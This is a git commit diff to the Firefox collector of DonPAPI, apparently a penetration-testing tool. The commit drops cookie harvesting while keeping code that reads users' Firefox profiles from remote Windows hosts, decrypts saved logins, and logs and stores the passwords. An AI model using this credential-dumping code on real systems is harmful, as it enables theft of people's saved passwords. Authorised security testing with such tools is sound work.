7266f1685256464cc4a1efa7641711ee042ca493
AYSerkov <62057033+AYSerkov@users.noreply.github.com>
2024-11-01 21:40:43 +0300

    Update Firefox.py

--- donpapi/collectors/Firefox.py
+++ donpapi/collectors/Firefox.py
@@ -16,27 +16,14 @@ from dploot.lib.target import Target
 from donpapi.core import DonPAPICore
 from donpapi.lib.logger import DonPAPIAdapter
 
-
 CKA_ID = unhexlify("f8000000000000000000000000000001")
 
-class FirefoxLoginData:
-    def __init__(self, winuser: str, url: str, username: str, password: str):
-        self.winuser = winuser
-        self.url = url
-        self.username = username
-        self.password = password
-
 @dataclass
-class FirefoxCookie:
+class FirefoxLoginData:
     winuser: str
-    host:str
-    path: str
-    cookie_name:str
-    cookie_value:str
-    creation_utc:str
-    expires_utc:str
-    last_access_utc:str
-
+    url: str
+    username: str
+    password: str
 
 class Firefox:
     firefox_generic_path = "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
@@ -54,30 +41,21 @@ class Firefox:
 
     def run(self):
         self.logger.display("Dumping User Firefox Browser")
-        firefox_credentials, firefox_cookies = self.collect()
+        firefox_credentials = self.collect()
         for credential in firefox_credentials:
             url = credential.url + " -" if credential.url != "" else "-"
             self.logger.secret(f"[{credential.winuser}] [Password] {url} {credential.username}:{credential.password}", self.tag)
-            self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username, password=credential.password, target=credential.url)
-        for cookie in firefox_cookies:
-            if cookie.cookie_value != "":
-                self.logger.secret(f"[{cookie.winuser}] [Cookie] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}", self.tag)
-                self.context.db.add_cookie(
-                    computer=self.context.host,
-                    browser=self.tag,
-                    windows_user=cookie.winuser,
-                    url=f"{cookie.host}{cookie.path}",
-                    cookie_name=cookie.cookie_name,
-                    cookie_value=cookie.cookie_value,
-                    creation_utc=cookie.creation_utc,
-                    expires_utc=cookie.expires_utc, 
-                    last_access_utc=cookie.last_access_utc,
-                )
+            self.context.db.add_secret(
+                computer=self.context.host,
+                collector=self.tag,
+                windows_user=credential.winuser,
+                username=credential.username,
+                password=credential.password,
+                target=credential.url
+            )
 
     def collect(self):
         firefox_data = []
-        firefox_cookies = []
-        # list users
         users = self.context.users
         for user in users:
             try:
@@ -90,11 +68,6 @@ class Firefox:
                 continue
             for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
                 try:
-                    cookies_path = ntpath.join(self.firefox_generic_path.format(user),d.get_longname(),"cookies.sqlite")
-                    cookies_data = self.conn.readFile(self.context.share, cookies_path)
-                    if cookies_data is not None:
-                        firefox_cookies += self.parse_cookie_data(user, cookies_data)
-
                     logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
                     logins_data = self.conn.readFile(self.context.share, logins_path)
                     if logins_data is None:
@@ -130,30 +103,7 @@ class Firefox:
                     if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                         continue
                     self.logger.exception(e)
-        return firefox_data, firefox_cookies
-
-    def parse_cookie_data(self, windows_user, cookies_data):
-        cookies = []
-        fh = tempfile.NamedTemporaryFile(delete=False)
-        fh.write(cookies_data)
-        fh.seek(0)
-        db = sqlite3.connect(fh.name)
-        cursor = db.cursor()
-        cursor.execute("SELECT name, value, host, path, expiry, lastAccessed, creationTime FROM moz_cookies;")
-        for name, value, host, path, expiry, lastAccessed, creationTime in cursor:
-            cookies.append(
-                FirefoxCookie(
-                    winuser=windows_user,
-                    host=host,
-                    path=path,
-                    cookie_name=name,
-                    cookie_value=value,
-                    creation_utc=creationTime,
-                    last_access_utc=lastAccessed,
-                    expires_utc=expiry,
-                )
-            )
-        return cookies
+        return firefox_data
 
     def get_login_data(self, logins_data):
         json_logins = json.loads(logins_data)
@@ -169,9 +119,6 @@ class Firefox:
         ]
 
     def get_key(self, key4_data, master_password=b""):
-        # Instead of disabling "delete" and removing the file manually,
-        # in the future (py3.12) we could use "delete_on_close=False" as a cleaner solution
-        # Related issue: #134
         fh = tempfile.NamedTemporaryFile(delete=False)
         fh.write(key4_data)
         fh.seek(0)
@@ -210,7 +157,7 @@ class Firefox:
     def is_master_password_correct(self, key_data, master_password=b""):
         try:
             entry_salt = b""
-            global_salt = key_data[0]  # Item1
+            global_salt = key_data[0]
             item2 = key_data[1]
             decoded_item2 = decoder.decode(item2)
             cleartext_data = self.decrypt_3des(decoded_item2, master_password, global_salt)
@@ -232,7 +179,6 @@ class Firefox:
 
     @staticmethod
     def decrypt(key, iv, ciphertext):
-        """Decrypt ciphered data (user / password) using the key previously found"""
         cipher = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv)
         data = cipher.decrypt(ciphertext)
         nb = data[-1]
@@ -240,6 +186,7 @@ class Firefox:
             return data[:-nb]
         except Exception:
             return data
+
 
     @staticmethod
     def decrypt_3des(decoded_item, master_password, global_salt):
